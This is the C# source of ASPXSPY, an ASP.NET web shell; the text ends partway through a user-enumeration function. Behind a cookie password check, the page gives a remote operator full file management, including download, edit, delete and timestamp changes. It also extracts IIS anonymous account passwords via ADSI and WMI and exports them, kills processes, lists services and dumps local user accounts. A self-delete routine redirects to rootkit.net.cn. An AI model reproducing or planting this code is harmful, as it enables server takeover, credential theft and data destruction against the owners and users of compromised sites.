<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">

public string Password="5add9b01377d0208d739ef5f1e6b1352";//admin
public string iSBEf="mjj";
public int inwI=1;
protected OleDbConnection jWP=new OleDbConnection();
protected OleDbCommand NkAL=new OleDbCommand();
public NetworkStream NS=null;
public NetworkStream NS1=null;
TcpClient tcp=new TcpClient();
TcpClient IZdg=new TcpClient();
ArrayList kVaC=new ArrayList();
protected void Page_load(object sender,EventArgs e)
{
NOBv(this);
if (!TgZ())
{
return;
}
if(IsPostBack)
{
BGcbE();
string cGiB=Request["__EVENTTARGET"];
string SFR=Request["__File"];
if(cGiB!="")
{
switch(cGiB)
{
case "Bin_Parent":
jWR(mtTO(SFR));
break;
case "Bin_Listdir":
jWR(mtTO(SFR));
break;
case "IyNdw":
IyNdw(mtTO(SFR));
break;
case "Bin_Createfile":
eYl(SFR);
break;
case "Bin_Editfile":
eYl(SFR);
break;
case "Bin_Createdir":
Bsa(SFR);
break;
case "GflLH":
GflLH(SFR);
break;
case "KDIM":
KDIM(mtTO(SFR));
break;
case "jgI":
jgI(SFR);
break;
case "Bin_Regread":
Ipm(mtTO(SFR));
break;
case "cxp":
cxp();
break;
case "fTlZ":
fTlZ(SFR);
break;
}
if(cGiB.StartsWith("mNS"))
{
mNS(mtTO(cGiB.Replace("mNS","")),SFR);
}
else if(cGiB.StartsWith("turQ"))
{
turQ(mtTO(cGiB.Replace("turQ","")),SFR);
}
else if(cGiB.StartsWith("Bin_CFile"))
{
uQIim(mtTO(cGiB.Replace("Bin_CFile","")),SFR);
}
}
}
else
{
nqu();
}
}
// MAIN VOID
public bool TgZ()
{
if(Request.Cookies[iSBEf]==null)
{
jPEt();
return false;
}
else
{
if (Request.Cookies[iSBEf].Value!=Password)
{
jPEt();
return false;
}
else
{
return true;
}
}
}
public void jPEt()
{
Vrro.Visible=true;
cpuP.Visible=false;
}
protected void qtB(object sender,EventArgs e)
{
Session.Abandon();
Response.Cookies.Add(new HttpCookie(iSBEf,null));
jPEt();
}
public void nqu()
{
cpuP.Visible=true;
Vrro.Visible=false;
HbIQ.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
HtE.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
ppHmW.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('cxp','');};";
dGrI.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
xXTc.InnerHtml="Framework Ver : "+Environment.Version.ToString();
//SLfr.Value=mzCU(Server.MapPath("."));
if (SLfr.Value==string.Empty)
{
SLfr.Value=mzCU(Server.MapPath("."));
}
BAv.InnerText="File Manager >>";
jWR(SLfr.Value);
}
public void BGcbE()
{
string[] gmmY=Directory.GetLogicalDrives();
for(int i=0;i<gmmY.Length;i++)
{
Control c=ParseControl(" <asp:LinkButton Text='"+yRd(gmmY[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+gmmY[i]+"'/> | ");
NljI.Controls.Add(c);
LinkButton vYxr=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
vYxr.Command+=new CommandEventHandler(this.CPWHl);
}
}
public string mzCU(string path)
{
if(path.Substring(path.Length-1,1)!=@"\")
{
path=path+@"\";
}
return path;
}
public string KRb(string path)
{
char[] trim={'\\'};
if(path.Substring(path.Length-1,1)==@"\")
{
path=path.TrimEnd(trim);
}
return path;
}
[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
public static extern int siZG(string nDrive);
public string yRd(string instr)
{
string Hfp=string.Empty;
int num=siZG(instr);
switch(num)
{
case 1:
Hfp="Unknow("+instr+")";
break;
case 2:
Hfp="Removable("+instr+")";
break;
case 3:
Hfp="Fixed("+instr+")";
break;
case 4:
Hfp="Network("+instr+")";
break;
case 5:
Hfp="CDRom("+instr+")";
break;
case 6:
Hfp="RAM Disk("+instr+")";
break;
}
return Hfp.Replace(@"\","");
}
public string SOfU(string instr)
{
byte[] tmp=Encoding.Default.GetBytes(instr);
return Convert.ToBase64String(tmp);
}
public string mtTO(string instr)
{
byte[] tmp=Convert.FromBase64String(instr);
return Encoding.Default.GetString(tmp);
}
public void jWR(string path)
{
Tij();
LBXA.Visible=true;
BAv.InnerText="File Manager >>";
SLfr.Value=mzCU(path);
DirectoryInfo JNhI=new DirectoryInfo(path);
if(Directory.GetParent(KRb(path))!=null)
{
string bg=lDD();
TableRow p=new TableRow();
for(int i=1;i<6;i++)
{
TableCell pc=new TableCell();
if(i==1)
{
pc.Width=Unit.Parse("2%");
pc.Text="0";
p.CssClass=bg;
}
if(i==2)
{
pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+SOfU(Directory.GetParent(KRb(path)).ToString())+"')\">Parent Directory</a>";
}
p.Cells.Add(pc);
fLaRz.Rows.Add(p);
}
}
try
{
int tQDnR=0;
foreach(DirectoryInfo Bin_folder in JNhI.GetDirectories())
{
string bg=lDD();
tQDnR++;
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="0";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Cells.Add(tc);
TableCell dVS=new TableCell();
dVS.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+SOfU(SLfr.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
tr.Cells.Add(dVS);
TableCell KKOp=new TableCell();
KKOp.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
tr.Cells.Add(KKOp);
fLaRz.Rows.Add(tr);
TableCell KhA=new TableCell();
KhA.Text="--";
tr.Cells.Add(KhA);
fLaRz.Rows.Add(tr);
TableCell Dbd=new TableCell();
Dbd.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('IyNdw','"+SOfU(SLfr.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+SLfr.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('mNS"+SOfU(SLfr.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
tr.Cells.Add(Dbd);
fLaRz.Rows.Add(tr);
}
TableRow gCli=new TableRow();
gCli.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
gCli.Attributes["bgcolor"]="#dddddd";
TableCell gyNa=new TableCell();
gyNa.Attributes["colspan"]="6" ;
gyNa.Attributes["height"]="5";
gCli.Cells.Add(gyNa);
fLaRz.Rows.Add(gCli);
int ackO=0;
foreach(FileInfo Bin_Files in JNhI.GetFiles())
{
ackO++;
string gb=lDD();
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+SOfU(Bin_Files.Name)+"\">";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=gb;
tr.Attributes["onmouseout"]="this.className='"+gb+"';";
tr.Cells.Add(tc);
TableCell filename=new TableCell();
//Response.Write(Bin_Files.FullName+"|"+Request.PhysicalApplicationPath+"|");
//Response.Write(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath));
if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
{
string url=Request.Url.ToString();
filename.Text="<a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+Bin_Files.Name+"</a>";
}
else
{
filename.Text=Bin_Files.Name;
}
//filename.Text=Bin_Files.Name;
TableCell Srw=new TableCell();
Srw.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
TableCell eMEtf=new TableCell();
eMEtf.Text=yeeIu(Bin_Files.Length);
TableCell BMJw=new TableCell();
BMJw.Text="<a href=\"#\" onclick=\"Bin_PostBack('KDIM','"+SOfU(SLfr.Value+Bin_Files.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+SLfr.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+SOfU(SLfr.Value+Bin_Files.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+SLfr.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('turQ"+SOfU(SLfr.Value+Bin_Files.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('GflLH','"+Bin_Files.Name+"')\">Time</a> ";
tr.Cells.Add(filename);
tr.Cells.Add(Srw);
tr.Cells.Add(eMEtf);
tr.Cells.Add(BMJw);
fLaRz.Rows.Add(tr);
}
string lgb=lDD();
TableRow eZWs=new TableRow();
eZWs.CssClass=lgb;
for(int i=1;i<4;i++)
{
TableCell OGpt=new TableCell();
if(i==1)
{
OGpt.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
}
if(i==2)
{
OGpt.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('jgI',d_file)};}\">Delete selected</a>";
}
if(i==3)
{
OGpt.ColumnSpan=4;
OGpt.Style.Add("text-align","right");
OGpt.Text=tQDnR+" directories/ "+ackO+" files";
}
eZWs.Cells.Add(OGpt);
}
fLaRz.Rows.Add(eZWs);
}
catch(Exception error)
{
NxO(error.Message);
}
}
public string lDD()
{
inwI++;
if(inwI % 2==0)
{
return "alt1";
}
else
{
return "alt2";
}
}
public void IyNdw(string jyXM)
{
try
{
Directory.Delete(jyXM,true);
NxO("Directory delete new success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(Directory.GetParent(jyXM).ToString());
}
public void mNS(string sdir,string ddir)
{
try
{
Directory.Move(sdir,ddir);
NxO("Directory Renamed Success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
public void turQ(string sfile,string dfile)
{
try
{
File.Move(sfile,dfile);
NxO("File Renamed Success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
public void uQIim(string spath,string dpath)
{
try
{
File.Copy(spath,dpath);
NxO("File Copy Success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
public void Bsa(string path)
{
try
{
Directory.CreateDirectory(SLfr.Value+path);
NxO("Directory created success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
public void eYl(string path)
{
if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
{
foreach(ListItem item in qtw.Items)
{
if(item.Selected=true)
{
item.Selected=false;
}
}
}
BAv.InnerHtml="Create/ Edit File >>";
Tij();
GKMQ.Visible=true;
if(path.IndexOf(":")< 0)
{
wuBA.Value=SLfr.Value+path;
}
else
{
wuBA.Value=path;
}
if(File.Exists(wuBA.Value))
{
StreamReader sr;
if(qtw.SelectedItem.Text=="UTF-8")
{
sr=new StreamReader(wuBA.Value,Encoding.UTF8);
}
else
{
sr=new StreamReader(wuBA.Value,Encoding.Default);
}
tFp.InnerText=sr.ReadToEnd();
sr.Close();
}
else
{
tFp.InnerText=string.Empty;
}
}
public void KDIM(string path)
{
FileInfo fs=new FileInfo(path);
Response.Clear();
Page.Response.ClearHeaders();
Page.Response.Buffer=false;
this.EnableViewState=false;
Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
Response.AddHeader("Content-Length",fs.Length.ToString());
Response.ContentType="application/unknown";
Response.WriteFile(fs.FullName);
Page.Response.Flush();
Page.Response.Close();
Response.End();
Page.Response.Clear();
}
public void jgI(string path)
{
try
{
string[] fciE=path.Split(',');
for(int i=0;i<fciE.Length-1;i++)
{
File.Delete(SLfr.Value+mtTO(fciE[i]));
}
NxO("File Delete Success !");
}
catch(Exception error)
{
NxO(error.Message);
}
jWR(SLfr.Value);
}
public void cxp()
{
try
{
File.Delete(Request.PhysicalPath);
Response.Redirect("http://www.rootkit.net.cn");
}
catch(Exception error)
{
NxO(error.Message);
}
}
public void GflLH(string path)
{
BAv.InnerHtml="Clone file was last modified time >>";
Tij();
Gvo.Visible=true;
XhKp.Value=SLfr.Value+path;
sFHT.Value=SLfr.Value;
ccKmv.Value=SLfr.Value+path;
string Att=File.GetAttributes(XhKp.Value).ToString();
if(Att.LastIndexOf("ReadOnly")!=-1)
{
eyc.Checked=true;
}
if(Att.LastIndexOf("System")!=-1)
{
pFP.Checked=true;
}
if(Att.LastIndexOf("Hidden")!=-1)
{
FeH.Checked=true;
}
if(Att.LastIndexOf("Archive")!=-1)
{
ldVI.Checked=true;
}
VQcc.Value=File.GetCreationTimeUtc(ccKmv.Value).ToString();
qoH.Value=File.GetLastWriteTimeUtc(ccKmv.Value).ToString();
jzRQ.Value=File.GetLastAccessTimeUtc(ccKmv.Value).ToString();
}
public static String yeeIu(Int64 fileSize)
{
if(fileSize<0)
{
throw new ArgumentOutOfRangeException("fileSize");
}
else if(fileSize >= 1024 * 1024 * 1024)
{
return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
}
else if(fileSize >= 1024 * 1024)
{
return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
}
else if(fileSize >= 1024)
{
return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
}
else
{
return string.Format("{0} B",fileSize);
}
}
private bool tZwWU(string sSrc)
{
Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
if(reg.IsMatch(sSrc))
{
return true;
}
else
{
return false;
}
}
public void xbsPz()
{
string jyXM=string.Empty;
string Wcwd="IIS://localhost/W3SVC";
JnJ.Style.Add("word-break","break-all");
try
{
DirectoryEntry JYVP=new DirectoryEntry(Wcwd);
int Lkd=0;
foreach(DirectoryEntry child in JYVP.Children)
{
if(tZwWU(child.Name.ToString()))
{
Lkd++;
DirectoryEntry newdir=new DirectoryEntry(Wcwd+"/"+child.Name.ToString());
DirectoryEntry INo=newdir.Children.Find("root","IIsWebVirtualDir");
string bg=lDD();
TableRow TR=new TableRow();
TR.Attributes["onmouseover"]="this.className='focus';";
TR.CssClass=bg;
TR.Attributes["onmouseout"]="this.className='"+bg+"';";
TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
for(int i=1;i<6;i++)
{
try
{
TableCell MXCoI=new TableCell();
switch(i)
{case 1:
MXCoI.Text=Lkd.ToString();
break;
case 2:
MXCoI.Text=INo.Properties["AnonymousUserName"].Value.ToString();
break;
case 3:
MXCoI.Text=INo.Properties["AnonymousUserPass"].Value.ToString();
break;
case 4:
StringBuilder sb=new StringBuilder();
PropertyValueCollection pc=child.Properties["ServerBindings"];
for (int j=0; j < pc.Count; j++)
{
sb.Append(pc[j].ToString()+"<br>");
}
MXCoI.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
break;
case 5:
MXCoI.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+SOfU(INo.Properties["Path"].Value.ToString())+"')\">"+INo.Properties["Path"].Value.ToString()+"</a>";
break;
}
TR.Cells.Add(MXCoI);
}
catch (Exception ex)
{
NxO(ex.Message);
continue;
}
}
JnJ.Controls.Add(TR);
}
}
}
catch(Exception error)
{
ONW();
}
}
public void ONW()
{
try
{
int Lkd=0;
ManagementScope veh=new ManagementScope(@"\\.\root\MicrosoftIISv2");
veh.Connect();
ObjectQuery GBaA=new ObjectQuery("SELECT Name,AnonymousUserName,AnonymousUserPass,Path FROM IISWebVirtualDirSetting");
ManagementObjectSearcher nPAR=new ManagementObjectSearcher(veh,GBaA);
ManagementObjectCollection yNc=nPAR.Get();
foreach(ManagementObject objmanage in yNc)
{
Lkd++;
string bg=lDD();
TableRow TR=new TableRow();
TR.Attributes["onmouseover"]="this.className='focus';";
TR.CssClass=bg;
TR.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i<6;i++)
{
try
{
TableCell MXCoI=new TableCell();
switch (i)
{
case 1:
MXCoI.Text=Lkd.ToString();
break;
case 2:
MXCoI.Text=objmanage["AnonymousUserName"].ToString();
break;
case 3:
MXCoI.Text=objmanage["AnonymousUserPass"].ToString();
break;
case 4:
GBaA=new ObjectQuery("SELECT ServerComment,ServerBindings from IISWebServerSetting where Name='"+Strings.Replace(objmanage["Name"].ToString(),"/root","",1,-1,CompareMethod.Text)+"'");
nPAR=new ManagementObjectSearcher(veh,GBaA);
ManagementObjectCollection Uim=nPAR.Get();
foreach(ManagementObject objsvr in Uim)
{
StringBuilder sb=new StringBuilder();
TR.Attributes["title"]="Site:"+objsvr["ServerComment"];
foreach(ManagementBaseObject objbind in (ManagementBaseObject[])objsvr["ServerBindings"])
{
sb.Append(objbind["IP"].ToString()+":"+objbind["Port"].ToString()+":"+objbind["Hostname"].ToString()+"<br>");
}
MXCoI.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
}
break;
case 5:
MXCoI.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+SOfU(objmanage["Path"].ToString())+"')\">"+objmanage["Path"].ToString()+"</a>";
break;
}
TR.Cells.Add(MXCoI);
}
catch (Exception ex)
{
NxO(ex.Message);
continue;
}
}
JnJ.Controls.Add(TR);
}
}
catch (Exception ex)
{
NxO(ex.Message);
}
}
public void YHT(object sender,EventArgs e)
{
string jyXM=string.Empty;
string Wcwd="IIS://localhost/W3SVC";
string Lhkxk="<table width=\"100%\" border=1 cellpadding=0 cellspacing=0><tr><td>IIS Spy</td><td Width=\"15%\">IIS_USER</td><td Width=\"15%\">IIS_PASS</td><td Width=\"20%\">Domain</td><td Width=\"30%\">Path</td></tr>\r\n";
try
{
DirectoryEntry JYVP=new DirectoryEntry(Wcwd);
int Lkd=0;
foreach(DirectoryEntry child in JYVP.Children)
{
try
{
if (tZwWU(child.Name.ToString()))
{
Lkd++;
DirectoryEntry newdir=new DirectoryEntry(Wcwd+"/"+child.Name.ToString());
DirectoryEntry INo=newdir.Children.Find("root","IIsWebVirtualDir");
string[] Atus=child.Properties["ServerBindings"][0].ToString().Split(':');
string url=Atus[2];
if (Atus[1]=="443")
{
url="https://"+url;
}
else
{
url="http://"+url;
if (Atus[1]!="80")
{
url+=":"+Atus[1];
}
}
url+="/";
Lhkxk+="<tr>";
Lhkxk+="<td>"+Lkd.ToString()+"</td>";
Lhkxk+="<td>"+INo.Properties["AnonymousUserName"].Value.ToString()+"</td>";
Lhkxk+="<td>"+INo.Properties["AnonymousUserPass"].Value.ToString()+"</td>";
Lhkxk+="<td>"+Atus[0]+":"+Atus[1]+":";
if (Atus[2].Length >= 1)
{
Lhkxk+="<a href='"+url+"' target='_blank'>"+Atus[2]+"</>";
}
Lhkxk+="</td>";
Lhkxk+="<td>"+INo.Properties["Path"].Value.ToString()+"</td>";
Lhkxk+="</tr>";
}
}
catch (Exception ex)
{
continue;
}
}
Lhkxk+="</table>";
}
catch(Exception error)
{
Lhkxk+=(error.Message);
}
Response.AddHeader("Content-Disposition","attachment;filename=IIS_Info-"+Request.ServerVariables["LOCAL_ADDR"]+".html");
Response.AddHeader("Content-Length",Lhkxk.Length.ToString());
Response.ContentType="text/html";
Response.Write(Lhkxk);
Response.End();
}
public ManagementObjectCollection MwNt(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
public DataTable yfyd(string query)
{
DataTable dt=new DataTable();
int i=0;
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
try
{
foreach(ManagementObject m in QS.Get())
{
DataRow dr=dt.NewRow();
PropertyDataCollection.PropertyDataEnumerator oEnum;
oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
while(oEnum.MoveNext())
{
PropertyData iSzB=(PropertyData)oEnum.Current;
if(dt.Columns.IndexOf(iSzB.Name)==-1)
{
dt.Columns.Add(iSzB.Name);
dt.Columns[dt.Columns.Count-1].DefaultValue="";
}
if(m[iSzB.Name]!=null)
{
dr[iSzB.Name]=m[iSzB.Name].ToString();
}
else
{
dr[iSzB.Name]=string.Empty;
}
}
dt.Rows.Add(dr);
}
}
catch(Exception error)
{
// NxO(error.Message);
}
return dt;
}
public void txI()
{
try
{
BAv.InnerText="Process >>";
Tij();
jwBFX.Visible=true;
int Rhk=0;
Process[] p=Process.GetProcesses();
foreach(Process sp in p)
{
Rhk++;
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=Rhk.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=sp.Id.ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=sp.ProcessName.ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=sp.Threads.Count.ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=sp.BasePriority.ToString();
tr.Controls.Add(td);
}
if(i==6)
{
td.Text="--";
tr.Controls.Add(td);
}
}
GNGqg.Controls.Add(tr);
}
}
catch(Exception error)
{
MwAe();
}
MwAe();
}
public void MwAe()
{
try
{
BAv.InnerText="Process >>";
Tij();
jwBFX.Visible=true;
int Rhk=0;
DataTable dt=yfyd("Win32_Process");
for(int j=0;j<dt.Rows.Count;j++)
{
Rhk++;
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=Rhk.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["ThreadCount"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=dt.Rows[j]["Priority"].ToString();
tr.Controls.Add(td);
}
if(i==6)
{
if( dt.Rows[j]["CommandLine"]!=string.Empty)
{
td.Text="<a href=\"javascript:Bin_PostBack('fTlZ','"+dt.Rows[j]["ProcessID"].ToString()+"')\">Kill</a>";
}
else
{
td.Text="--";
}
tr.Controls.Add(td);
}
}
GNGqg.Controls.Add(tr);
}
}
catch(Exception error)
{
NxO(error.Message);
}
}
public void fTlZ(string pid)
{
try
{
foreach(ManagementObject p in MwNt("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
{
p.InvokeMethod("Terminate",null);
p.Dispose();
}
NxO("Process Kill Success !");
}
catch(Exception error)
{
NxO(error.Message);
}
MwAe();
}
public void PrHSQ()
{
try
{
BAv.InnerText="Services >>";
Tij();
Rce.Visible=true;
int Rhk=0;
ServiceController[] SgH=System.ServiceProcess.ServiceController.GetServices();
for(int i=0;i<SgH.Length;i++)
{
Rhk++;
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
////tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
for(int b=1;b<7;b++)
{
TableCell td=new TableCell();
if(b==1)
{
td.Width=Unit.Parse("2%");
td.Text=Rhk.ToString();
tr.Controls.Add(td);
}
if(b==2)
{
td.Text="null";
tr.Controls.Add(td);
}
if(b==3)
{
td.Text=SgH[i].ServiceName.ToString();
tr.Controls.Add(td);
}
if(b==4)
{
td.Text="";
tr.Controls.Add(td);
}
if(b==5)
{
string dcq=SgH[i].Status.ToString();
if(dcq=="Running")
{
td.Text="<font color=green>"+dcq+"</font>";
}
else
{
td.Text="<font color=red>"+dcq+"</font>";
}
tr.Controls.Add(td);
}
if(b==6)
{
td.Text="";
tr.Controls.Add(td);
}
}
nsOp.Controls.Add(tr);
}
}
catch(Exception error)
{
NxO(error.Message);
}
}
public void XHp()
{
try
{
BAv.InnerText="Services >>";
Tij();
Rce.Visible=true;
int Rhk=0;
DataTable dt=yfyd("Win32_Service");
for(int j=0;j<dt.Rows.Count;j++)
{
Rhk++;
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=Rhk.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["PathName"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
string dcq=dt.Rows[j]["State"].ToString();
if(dcq=="Running")
{
td.Text="<font color=green>"+dcq+"</font>";
}
else
{
td.Text="<font color=red>"+dcq+"</font>";
}
tr.Controls.Add(td);
}
if(i==6)
{
td.Text=dt.Rows[j]["StartMode"].ToString();
tr.Controls.Add(td);
}
}
nsOp.Controls.Add(tr);
}
}
catch(Exception error)
{
PrHSQ();
}
}
public void xqD()
{
try
{
Tij();
PsF.Visible=true;
BAv.InnerText="User Information >>";
DirectoryEntry jTwVl=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
foreach(DirectoryEntry child in jTwVl.Children)
{
foreach(string name in child.Properties.PropertyNames)
{
// Response.Write(name+":"+ child.Properties[name] +"<br>");
PropertyValueCollection pvc=child.Properties[name];
int c=pvc.Count;
for(int i=0;i<c;i++)
{
if(name!="objectSid"&&name!="Parameters"&&name!="LoginHours")
{
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=name;
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=pvc[i].ToString();
tr.Controls.Add(td1);
oXp.Controls.Add(tr);
}
}
}
TableRow trn=new TableRow();
for(int x=1;x<3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
oXp.Controls.Add(trn);
}
}
}
catch(Exception error)
{
NxO(error.Message);
}
}
public void TKYCx()
{
try
{
Tij();
PsF.Visible=true;
BAv.InnerText="User Information >>";
DataTable user=yfyd("Win32_UserAccount");
for(int i=0;i<user.Rows.Count;i++)
{
for(int j=0;j<user.Columns.Count;j++)
{
string bg=lDD();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=user.Columns[j].ToString();
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=user.Rows[i][j].ToString();
tr.Controls.Add(td1);
oXp.Controls.Add(tr);
}
TableRow trn=new TableRow();
for(int x=1;x<3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
oXp.Controls.Add(trn);
}
}
}
